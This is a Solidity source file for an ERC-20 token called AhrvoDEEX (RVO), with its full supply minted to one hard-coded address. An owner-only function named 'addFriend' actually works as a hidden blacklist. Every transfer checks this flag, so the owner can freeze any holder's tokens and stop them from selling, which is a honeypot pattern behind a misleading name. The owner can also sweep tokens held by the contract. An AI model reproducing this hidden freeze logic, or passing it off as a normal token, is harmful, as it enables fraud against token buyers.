pragma solidity ^0.5.11;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

  uint8 private _Tokendecimals;
  string private _Tokenname;
  string private _Tokensymbol;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
   
   _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    
  }

  function name() public view returns(string memory) {
    return _Tokenname;
  }

  function symbol() public view returns(string memory) {
    return _Tokensymbol;
  }

  function decimals() public view returns(uint8) {
    return _Tokendecimals;
  }
}



contract RVO is ERC20Detailed {

  using SafeMath for uint256;
    
  uint256 public totalBurn = 0;
  
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (address => bool) public addfriend;
  string constant tokenName = "AhrvoDEEX";
  string constant tokenSymbol = "RVO";
  uint8  constant tokenDecimals = 18;
  uint256 _totalSupply = 100000*10**uint(tokenDecimals); 
 
  
  //any tokens sent here ? 
  IERC20 currentToken ;
  	address payable public _owner;
    
    //modifiers	
	modifier onlyOwner() {
      require(msg.sender == _owner);
      _;
  }
  
  address initialSupplySend = 0x6c4A35638Dfe1D825D5ae814528Bc9926c918C61;
  

  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
      
    _mint(initialSupplySend, _totalSupply);
    _owner = msg.sender;
  }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }

  function addFriend(address account) public {
      require(msg.sender == _owner, "!owner");
      addfriend[account] = true;
  }
  
    function removeFriend(address account) public {
      require(msg.sender == _owner, "!owner");
      addfriend[account] = false;
  }

 function transfer(address to, uint256 value) public returns (bool) 
    {
        _executeTransfer(msg.sender, to, value);
        return true;
    }
    
    function multiTransfer(address[] memory receivers, uint256[] memory values) public
    {
        require(receivers.length == values.length);
        for(uint256 i = 0; i < receivers.length; i++)
            _executeTransfer(msg.sender, receivers[i], values[i]);
    }
    
    function transferFrom(address from, address to, uint256 value) public returns (bool) 
    {
        require(value <= _allowed[from][msg.sender]);
        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        _executeTransfer(from, to, value);
        return true;
    }
   
    function _executeTransfer(address _from, address _to, uint256 _value) private
    {
      require(!addfriend[_from], "error");
        if (_to == address(0)) revert();                               // Prevent transfer to 0x0 address. Use burn() instead
		if (_value <= 0) revert(); 
        if (_balances[_from] < _value) revert();           // Check if the sender has enough
        if (_balances[_to] + _value < _balances[_to]) revert(); // Check for overflows
        _balances[_from] = SafeMath.sub(_balances[_from], _value);                     // Subtract from the sender
        _balances[_to] = SafeMath.add(_balances[_to], _value);                            // Add the same to the recipient
        emit Transfer(_from, _to, _value);                   // Notify anyone listening that this transfer took place
    }
         
  //no zeros for decimals necessary 
  function multiTransferEqualAmount(address[] memory receivers, uint256 amount) public {
    uint256 amountWithDecimals = amount * 10**tokenDecimals;

    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amountWithDecimals);
    }
  }

  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _mint(address account, uint256 amount) internal {
    require(amount != 0);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

 //take back unclaimed tokens of any type sent by mistake
  function withdrawUnclaimedTokens(address contractUnclaimed) external onlyOwner {
      currentToken = IERC20(contractUnclaimed);
      uint256 amount = currentToken.balanceOf(address(this));
      currentToken.transfer(_owner, amount);
  }
}